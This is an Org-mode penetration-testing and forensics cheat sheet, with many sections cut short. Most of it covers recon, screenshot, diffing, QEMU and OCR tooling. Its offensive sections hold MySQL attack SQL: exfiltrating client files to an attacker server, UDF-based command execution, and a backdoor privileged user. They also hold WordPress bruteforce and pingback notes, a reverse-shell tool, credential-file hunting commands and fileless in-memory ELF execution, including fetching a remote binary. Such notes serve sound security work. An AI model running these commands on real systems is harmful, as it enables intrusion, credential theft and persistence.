...
**** Dig
      - By querying Google's NS:
        #+begin_src sh
          # It might return the DNS server IP
...
**** Nmap
     ...
     - Segmented scan over SOCKS tunnel:
       ...
       #+end_src
**** Smap
     - [[https://github.com/s0md3v/Smap][Site]] - [[https://github.com/s0md3v/Smap/releases][Binary]] - shodan.io powered nmap:
       #+begin_src sh
         ...
         # IPv6 not supported
       #+end_src
     - List of [[https://github.com/s0md3v/Smap/blob/master/internal/output/xml.go#L13][shodan ports]]
**** Masscan
...
*** Screenshot
**** gowitness
     - [[https://github.com/sensepost/gowitness][Site]] - [[https://github.com/sensepost/gowitness/releases][Bin]] - Multi-URL screenshot+collage:
       #+begin_src sh
       ...
       #+end_src
**** capture-website-cli
     - [[https://github.com/sindresorhus/capture-website-cli][Site]] - Flexible Puppeteer web capture cli:
       #+begin_src sh
...
**** Mitmproxy
     - [[https://github.com/mitmproxy/mitmproxy][Site]] - Proxy - [[https://docs.mitmproxy.org/stable/overview-features/][Docs]]/[[https://docs.mitmproxy.org/stable/addons-examples/][Addons]] ([[https://github.com/mitmproxy/mitmproxy/blob/main/examples/contrib/xss_scanner.py][xss/sqli]]):
       #+begin_src sh
         ...
         # /usr/local/share/ca-certificates/mit.crt
...
*** PHP
**** Dictionaries
     - [[https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/Common-PHP-Filenames.txt][Common-PHP-Filenames.txt]]
     - [[https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt][CommonBackdoors-PHP.fuzz.txt]]
     - [[https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/PHP.fuzz.txt][PHP.fuzz.txt]]
**** Login Bypass
***** Array
...
****** Supported Functions
      ...
      - Try interacting with a test method:
        ...
        #+end_src
      - Or try with a [[https://developer.wordpress.org/apis/handbook/xml-rpc/][common one]]:
        #+begin_src sh
...
****** Credential Bruteforce
      ...
      - No ~multicall~, slower than login form:
        ...
        #+end_src
****** Pingback Attack
      - Useful for IP reveal (WAF bypass), Port Discovery (XSPA) and DoS - [[https://developer.wordpress.org/reference/classes/wp_xmlrpc_server/pingback_ping/][reference]]:
        #+begin_src sh
          # Try a https://postb.in/ as URL-FROM
          # URL-TO is: <site/127>/wordpress/?p=1
          # Try find leaked IPs via the JSON API:
          ...
          # faultCode > 0 -> open URL-FROM port
        #+end_src
...
*** Read/Write Files
    ...
    - Write binary data:
      #+begin_src sql
        -- Try: SELECT CONVERT.. INTO OUTFILE <F>
        CONVERT(unhex("<non-0x-hex>"), BINARY);

        CONVERT(from_base64("<base64>"), BINARY);
      #+end_src
    - Read file using function:
      #+begin_src sql
        SELECT LOAD_FILE('/tmp/users.txt');
      #+end_src
    - Send client local file to connected server:
      #+begin_src sql
        -- Connect victim client to attack server
        CREATE table temp_file(line BLOB);

        -- Load victim file into attacker server
        LOAD DATA local INFILE "<victim-file>" INTO table temp_file FIELDS TERMINATED BY '\n';

        SELECT * temp_file;

        DROP table temp_file;
      #+end_src
    - Also try the [[https://github.com/rmb122/rogue_mysql_server][rogue_mysql_server]]
*** RCE - Privilege Escalation
**** User Defined Function - UDF
     - Only MySQL v4-5 if running as root or priv
     - In the ~exploitdb~ there are versions for Python 2 (EID 46249) and 3 (EID 50236)
     - Manual - UDF [[https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql][compiled]] - [[https://github.com/sqlmapproject/udfhack][source]] - EID 1518:
       #+begin_src sql
         -- Check the user, permissions & version
         SELECT USER(), CURRENT_USER(), CURRENT_ROLE(), VERSION();
         ...
         INSERT INTO temp_udf VALUES(LOAD_FILE('<path/to/liblib_mysqludf>'));
         -- Or try with LOAD DATA local INFILE

         -- Find the plugin library
         SHOW variables LIKE '%plugin%';

         -- Create a UDF lib on the plugin lib
         -- Try skip the temp table with CONVERT
         SELECT * FROM temp_udf INTO dumpfile '<path-to-plugin-lib>/lib_mysqludf_sys.<ext>'

         -- Load the UDF
         CREATE function sys_exec RETURNS integer soname 'lib_mysqludf_sys.<ext>'

         -- Execute commands
         SELECT sys_exec('<system-cmd>');
...
*** Persistence
    - Create new privileged user:
      #+begin_src sql
        ...
        GRANT SELECT,CREATE,DROP,UPDATE,DELETE,INSERT ON *.* TO backup identified BY 'backup' WITH GRANT OPTION;
      #+end_src
** T-SQL (MSSQL)
*** Connection
**** Windows
...
*** Java Client - Database Manager GUI
    - Get the [[https://www.hsqldb.org/download/][JAR client]] and connect:
      #+begin_src sh
...
**** Read/Write File
    - Read using [[https://santuario.apache.org/Java/api/org/apache/xml/security/utils/JavaUtils.html#getBytesFromFile-java.lang.String-][JavaUtils getBytesFromFile]]:
      #+begin_src sql
      ...
      #+end_src
    - Write using [[https://santuario.apache.org/Java/api/org/apache/xml/security/utils/JavaUtils.html#writeBytesToFilename-java.lang.String-byte:A-][JavaUtils writeBytesToFilename]]:
      #+begin_src sql
...
** Tools
*** XC
    - [[https://github.com/xct/xc#setup][Site]] - Multipurpose nc-like rev-shell - Go
      #+begin_src sh
        # Create a listener
        xc -l -p <port>

        # Also starts by renaming to IP:port
        mv xc xc_<ip>_<port>
...
*** General
    ...
    - CPU and memory info:
      ...
      #+end_src
*** MySQL / MariaDB
    - Files with creds/hashes:
      #+begin_src sh
        # debian-sys-maint plaintext passwords
        less /etc/mysql/debian.cnf

        # Extract user hashes (mysql.user ones)
        grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
      #+end_src
    - General files:
      #+begin_src sh
        ls -lah ~/.mysql.history*

        ls -lah /etc/my.cnf*

        ls -lah /etc/mysql/my.cnf*

        ls -lah /var/lib/mysql/my.cnf*

        ls -lah ~/.my.cnf*

        ls -lah /etc/my.cnf*

        # Logs - try under /var/log
        find / \( -name "connections.log" -o -name "update.log" -o "common.log" \) -type f -ls 2>/dev/null
      #+end_src
** Windows
*** cmd.exe
...
** Comparison
*** Pkgdiff
    - [[https://github.com/lvc/pkgdiff][Site]] - Diff text files in archives/dirs
      #+begin_src sh
        pkgdiff -ignore-space-change -ignore-all-space -ignore-blank-lines -hide-unchanged -list-added-removed <tar-a> <tar-b>
        # -d       - Treat <tar-a> <tar-b> as dir
        # -details - C/C++ specific analysis

        # Open all diffs - ZSH expansion
        for f (pkgdiff_reports/**/diffs/**/*.html) xdg-open "$f"
      #+end_src
*** diffoscope
    - [[https://diffoscope.org/][Site]] - [[https://try.diffoscope.org/][Online]] - Diff files, binaries, etc
      #+begin_src sh
        diffoscope --no-default-limits --extended-filesystem-attributes --html <out.html> <tar-a> <tar-b>
        # --difftool <tool> - Diffs tools (delta)

        # Recommended to install via docker (2GB)
        docker run -it --rm -v <mount:point>:ro registry.salsa.debian.org/reproducible-builds/diffoscope

        # Default `pip install diffoscope' only
        # shows the diff of ls dates and perms
        # Min reqs: file and libarchive

        # Note: `pip install trydiffoscope' needs
        # requests
        trydiffoscope --webbrowser <a> <b>
      #+end_src
** Recovery
*** Ext4
**** ext4magic
...
*** x64
**** Blink
     - [[https://github.com/jart/blink][Site]] - Tiny [[roam:https://github.com/jart/cosmopolitan][Portable]] VM for x64 ELF bins
       #+begin_src sh
         ./configure
         make -j8 MODE=tiny
         ...
         o/tiny/blink/blink <path-to-bin>
         # Might need the LD_LIBRARY_PATH
       #+end_src
** Run ELF From Memory
*** Perl
    - Invoking the system call ~memfd_create~ followed by ~execve~:
      #+begin_src sh
        # From stdin
        perl -e '$fd=syscall(319,$name="test",1);open FD,">&$fd";print FD<STDIN>;exec"/proc/self/fd/$fd","-lah"' < /bin/ls
        # memfd_create is syscall 319 in x64

        # Or, from file (if no exec permissions)
        perl -e '$fd=syscall(319,$name="test",1);open FD,">&=$fd";open LS,"</bin/ls";print FD<LS>;exec"/proc/self/fd/$fd","-lah"'

        # Notes:
        # - Duplicating the FD is a workaround
        # - Naming the memfd is also a workaround
        #
        # 1 -> MFD_CLOEXEC -> O_CLOEXEC
        # It is also possible to allocate the mem
        # in huge pages with 4 -> MFD_HUGETLB
      #+end_src
    - Alternatively, you can resolve ~memfd_create~
      #+begin_src sh
        # First convert to header.h to header.ph
        mkdir /tmp/ph
        ( cd /usr/include && h2ph -ad /tmp/ph syscall.h )

        # Use them for resolving memfd_create
        perl -I/tmp/ph -e 'require"syscall.ph";$fd=syscall(&SYS_memfd_create,$name="test",1);open FD,">&=:raw",$fd;open LS,"<:raw","/bin/ls";print FD<LS>;exec"/proc/self/fd/$fd","-lah"'
      #+end_src
*** Memit
    - [[https://github.com/liamg/memit][Site]] - Run remote file from memory - Go
    #+begin_src sh
      memit https://<site>/<bin> -- <args>
    #+end_src
*** elfexec
    - [[https://github.com/abbat/elfexec][Site]] - Run binaries from pipe - C
      #+begin_src sh
      elfexec <args> < <bin>
      #+end_src
*** Memrun
    - [[https://github.com/guitmz/memrun][Site]] - Same as above, no args - Go + ASM
*** go-memexec
    - [[https://github.com/amenzhinsky/go-memexec][Site]] - Library to run binaries from go vars
** Utils
*** Eget
    - [[https://github.com/zyedidia/eget][Site]] - Easy download pre-build Github bins
      #+begin_src sh
        # Download + extract exa to tmp
        eget ogham/exa --asset musl --to /tmp
      #+end_src
*** Exa
    - [[https://github.com/ogham/exa][Site]] - Modern ~ls~ replacement
      #+begin_src sh
        # Recurse-show with ext attrs in a tree
        exa --icons -@ -T .
      #+end_src
* Forensics
** Windows
...
**** DBX
     ...
     - Open ~MBOX~ files in ~mutt~:
       ...
       #+end_src
**** TODO PST
     - [[https://www.five-ten-sg.com/libpst/][readpst]] - export PST to various formats
** TODO Linux
...
*** Convert IMG to stdout
    - Using the ~vbox-img~ tool:
      #+begin_src sh
        vbox-img convert --srcfilename <file> --stdout --dstformat RAW
      #+end_src
** Qemu
   - Start ISO over KVM - ~qemu-desktop~:
     #+begin_src sh
       # Load the kvm_intel/amd kernel modules
       qemu-system-x86_64 -enable-kvm -device es1370 -nic user -device virtio-mouse-pci -device virtio-tablet-pci -device virtio-keyboard-pci -cpu host -serial none -parallel none -device virtio-vga-gl -display gtk,gl=on -m 4G -smp 4 -cdrom <path-to.iso>
       # For HiDPI add video=<w>x<h> inside guest
       # -display sdl,gl=on - Best if HiDPI video
       # -device virtio-vga - Non accelerated
       # -device virtio-vga-gl,xres=<w>,yres=<h>
       #
       # File Sharing
       # ... <- Complete
       # https://wiki.qemu.org/Documentation/9psetup
       # ^ Unix only, check steps 8 and 9
       # ... SMB alternative
       # -nic user,id=nic0,smb=<local-dir> - Win
       #
       # Port forwarding <host>-:<guest>
       # -nic user,hostfwd=tcp::222-:22[,hostfwd]
       #
       # -nic user equivalent: -net nic -net user
       #
       # -device es1370 -> emulated sound card
       # -> qemu-system-x86_64 -soundhw help

       # Add if needed for true randomness
...
*** OCR Text Layer
**** OCRmyPDF
     - [[https://github.com/ocrmypdf/OCRmyPDF][Site]] - Make PDF searchable with text layer
       #+begin_src sh
         # Uses Tesseract OCR engine
         ocrmypdf <input.pdf> <output.pdf>
         # -l <lang1+lang2>  - Add languages
         # --jobs <n>        - Limit to N cores
         # --rotate-pages    - Fix misrotation
         # --deskew          - Fix crooked PDFs
         # --output-type <t> - PDF/A by default
         # --title "<title>" - Add a title
         # --optimize 3      - Optimize for size
         # -c                - Clean with unpaper
         # -i                - Keep -c in out PDF
         # -f                - Ignore all OCR
         # -s                - Keep existing OCR
         # --redo-ocr        - Redo old OCR layer
         # --tesseract-oem 1 - Use specific mode
       #+end_src
** OCR
*** Tesseract
    - [[https://github.com/tesseract-ocr/tesseract/][Site]] - State-of-the-art OCR engine:
      #+begin_src sh
    ...
    - Or use GhostScript to convert them to PNG:
      ...
      #+end_src
*** EasyOCR
    - [[https://github.com/JaidedAI/EasyOCR][Site]] - PyTorch GPU OCR lib+tool ([[https://github.com/JaidedAI/EasyOCR/blob/master/easyocr/config.py#L29][langs]]):
      #+begin_src sh
        # Uses CUDA
        MODULE_PATH=/tmp/EasyOCR easyocr -l <lang> --detail=0 --gpu=True <image.jpg/png>
        # MODULE_PATH=<d> - Storage for downloads
        # --detail=<0/1>  - Show extra info
      #+end_src
    - More options [[https://www.jaided.ai/easyocr/documentation/][here]]
*** Ocrad
    - [[https://www.gnu.org/software/ocrad/][Site]] - [[https://ftp.gnu.org/gnu/ocrad/][Download]] - Non-lang dependant OCR:
      #+begin_src sh
